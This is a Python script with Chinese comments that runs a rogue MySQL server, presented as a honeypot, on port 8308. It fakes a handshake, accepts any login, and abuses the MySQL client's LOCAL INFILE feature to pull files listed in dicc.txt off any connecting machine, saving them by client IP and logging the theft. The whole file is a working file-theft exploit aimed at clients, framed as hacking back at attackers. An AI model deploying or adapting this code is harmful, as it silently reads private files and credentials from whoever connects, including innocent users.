# coding=utf-8
import time
import socket
import os
import sys
from common import utils


#  蜜罐子函数
def mysql_get_file_content(sv, filename):
    # 准备保存的文件夹，不存在则创建
    conn, address = sv.accept()  # 接受来自客户端的新连接，并将连接对象和客户端的地址分别分配给 conn 和 address 变量。
    logpath = os.path.abspath('.') + "/static/log/" + address[0]

    # 构造日志文件的保存路径。它使用客户端的 IP 地址作为文件夹名称，并且路径相对于当前工作目录
    if not os.path.exists(logpath):  # 检查日志目录是否存在。如果没有，它将创建目录
        os.makedirs(logpath)

    # 向客户端发送握手信息并接受响应，包括服务端的版本信息、认证方式等，
    conn.sendall(
        b"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
    # 向客户端发送字节编码的握手消息。该消息包含有关服务器的信息，例如版本 （5.5.53）、身份验证方法和其他特定于协议的详细信息。
    nr = conn.recv(9999)  # 读取来自客户端的响应

    # auth okay
    # 忽略用户输入的用户名密码信息，直接返回认证成功消息
    conn.sendall(b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
    nr = conn.recv(9999)  # 读取客户端对身份验证成功消息的响应

    # 向客户端发送Response TABULAR响应包，并指定要读取的文件名    
    wantfile = chr(len(filename) + 1).encode() + b"\x00\x00\x01\xFB"
    # 构造一条字节编码的消息，指定客户端要检索的文件。该消息包括文件名的长度（空终止符加 1）和与协议相关的特定字节序列。
    w = wantfile + filename.encode()  # 将实际文件名（编码为字节）附加到上一步中构造的消息中。
    conn.sendall(w)  # 将完整的文件请求消息发送到客户端
    content = conn.recv(99999)
    # 读取客户端为响应文件请求而发送的文件内容
    # 关闭连接  期待它的下次连接以继续读新的文件
    conn.close()
    # 判断取回的数据是否为文件内容
    if len(content) > 4:  # 检查内容变量的长度是否大于 4 个字节，以确保接收到的数据不仅仅是与协议相关的小消息，而是实际的文件内容。
        savefs = logpath + "/" + filename.replace("/", "_").replace(":", "_")
        # 构造将保存接收的文件内容的文件路径。它使用 logpath 变量（在函数的前面设置），并将文件名中的任何正斜杠/或冒号:替换为下划线以创建有效的文件名。
        with open(savefs, "wb") as txt:  # 在二进制写入模式下在 savefs 路径处打开一个新文件
            txt.write(content)  # 将内容（从客户端接收的文件内容）写入新创建的文件
        # ss = '有人试图登录蜜罐，已经开始反制取得文件:%s,文件长度%s字节,保存在%s' % (filename, len(content), savefs)
        ss = f'有人试图登录蜜罐，已经开始反制取得文件:{filename},文件长度{len(content)}字节,保存在{savefs}'
        # 构造一条日志消息，其中包含有关检索到的文件的信息，例如文件名、文件内容的长度以及保存文件的路径
        with open('run.log', 'a', encoding='utf-8') as f:  # 以追加模式打开run.log文件,写入日志
            f.write(time.strftime('%Y-%m-%d %H:%M:%S,') + ss + '\n')
        savefs = f'/static/log/{address[0]}/{filename.replace("/", "_").replace(":", "_")}'
        rr = ['HPT', address[0], savefs, ss]  # 创建一个列表，其中包含有关事件的信息，包括事件类型（蜜罐为“HPT”）、客户端的 IP 地址、保存文件的路径和日志消息。
        print(rr)
        utils.insert_adm(rr)  # type,ip,url,info  # 从名为 utils 的模块调用名为 insert_adm 的函数，将 rr 列表作为参数传递，将事件信息写入数据库
        return True
    else:  # 否则返回失败标志
        ss = '有人试图登录蜜罐，反制未能取得文件:%s' % filename
        with open('run.log', 'a', encoding='utf-8') as f:
            f.write(time.strftime('%Y-%m-%d %H:%M:%S,') + ss + '\n')  # 写入日志
        rr = ['HPT', address[0], '', ss]  # 创建包含事件信息的列表，注意是空字符串（因为未保存文件）
        return False


def run(port):
    # 创建并开始监听 port，该函数设置服务器套接字并开始侦听指定端口上的传入连接
    sv = socket.socket()  # 创建一个新的套接字对象
    sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # 设置一个套接字选项，允许服务器重用相同的地址和端口，即使套接字处于TIME_WAIT状态，可避免重新启动服务器时出现“地址已在使用中”错误。
    sv.bind(("", port))  # 将套接字绑定到指定的端口。空字符串作为第一个参数表示套接字将侦听所有可用的网络接口
    sv.listen(5)  # 套接字设置为侦听模式，并指定排队连接的最大数量为5
    print("Listen Begin in port " + str(port))
    # 测试方法，在本机另外一终端，执行 mysql -u root -h 127.0.0.1 -P 8308 , 8308是蜜罐监听的端口

    # 循环监听 从dicc.txt中取得需要反制读取的文件名，一一进行获取
    # 因为攻击者使用字典爆破（不断尝试连接测试密码）,因此可以每次取一个文件。直到dicc.txt中的文件都取回
    while True:  # 连续读取dicc.txt中的文件，尝试使用 mysql_get_file_content 函数检索相应的文件，需要读取攻击者电脑上的什么文件，则把文件名填写到dicc.txt中
        with open("./dicc.txt") as dicc:  # 打开 当前目录中的dicc.txt文件
            for line in dicc.readlines():  # 循环遍历 dicc.txt 文件中的每一行
                filens = line.strip("\n")  # 从文件名末尾删除换行符，获得要读取的文件名（绝对地址）
                print('begin filens...', filens)
                # 开始读取文件，如果成功，则把文件保存到./static/log/攻击者ip地址/保存文件名 后，断开连接，等待攻击者再次连接，
                # 再取下一份文件

                res = mysql_get_file_content(sv, filens)  # 调用 mysql_get_file_content 函数，将服务器套接字 sv 和文件名 filens 作为参数传递。该函数负责处理文件检索过程。
                if res:  # 检查 mysql_get_file_content 函数的返回值
                    print("Read Success! ---> " + line)  # 成功获取了此文件
                else:
                    print("Not Found~ ---> " + line)  # 不成功


# 应用程序的入口点
if __name__ == "__main__":
    run(8308)
